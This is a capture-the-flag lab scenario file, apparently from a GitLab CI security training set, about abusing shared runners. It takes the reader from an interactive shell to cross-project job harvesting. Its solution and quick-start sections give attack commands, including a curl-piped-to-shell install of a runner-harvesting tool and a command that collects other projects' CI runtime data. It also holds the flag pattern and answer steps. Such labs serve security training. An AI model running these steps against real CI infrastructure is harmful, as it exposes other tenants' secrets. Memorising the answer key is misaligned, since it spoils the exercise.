---
id: scenario-04-runner-abuse
title: Shared Runner Access And Cross-Job Compromise
difficulty: advanced
order: 4
flags:
  - name: Runner Abuse Flag
    pattern: "^flag\\{runner_abuse_[a-z0-9]{16}\\}$"
solution:
  title: Solution
  content: |
    1. `pipeleek runners exploit`
    2. Inspect the triggered job logs, copy the generated SSHX URL, and open it.
    3. `curl -fsSL https://frjcomp.github.io/gl-runner-harvester/install.sh | sh`
    4. `/root/.local/bin/gl-runner-harvester harvest --collection-path /tmp/gl-harvest --interval 2`
    5. Review harvested job runtime data.
    6. `grep -r -i flag /tmp/`
hints:
  - title: Runner Context Access
    content: |
      Start from a project you can control and gain interactive runner execution
      context. The SSHX terminal opened via `pipeleek runners exploit` is sufficient
      to continue with harvesting.
  - title: Job Harvesting
    content: |
      After gaining runner execution context, enumerate and inspect recurring
      jobs from other projects. In this lab, Docker is mounted in the runner context,
      so no explicit host breakout is required.
      A purpose-built helper for this is [gl-runner-harvester](https://github.com/frjcomp/gl-runner-harvester),
      which you can run directly from that terminal.
  - title: Follow Scheduled Pipelines
    content: |
      The flag is not in your own attacker project output. Track scheduled pipelines
      and focus on cross-project runtime context.
---

## Objective

Exploit a shared runner misconfiguration to gain runner execution context, then pivot into recurring jobs from other projects to recover the flag.

## Background

Shared runners can become a high-impact pivot point when isolation boundaries are weak. Once an attacker gains runner execution context, they may observe or interfere with unrelated jobs that run on the same infrastructure.

This scenario focuses on a multi-step chain:

1. Controlled CI execution on a shared runner
2. Interactive access to runner execution context (for example via [SSHX](https://sshx.io/))
3. Cross-job collection from recurring pipelines
4. Flag extraction from collected runtime data

## Scenario Description

### Phase 1: Gain Interactive Runner Access

Enumerate which shared runners you have access to. Try to get an interactive Terminal. Pipeleek can help.

### Phase 2: Harvest Recurring Jobs

After gaining access to the shared runner execution context, enumerate jobs that execute on a schedule and collect their runtime context.

If you are unfamiliar with runner-host collection tooling, use [gl-runner-harvester](https://github.com/frjcomp/gl-runner-harvester).
It is designed to watch active GitLab runner jobs and collect CI runtime data from host context.

Quick start example:

```bash
# Install
curl -fsSL https://frjcomp.github.io/gl-runner-harvester/install.sh | sh

# Run it
/root/.local/bin/gl-runner-harvester harvest --collection-path /tmp/gl-harvest --interval 2
```

Harvest and wait and carefully inspect the output to find the flag.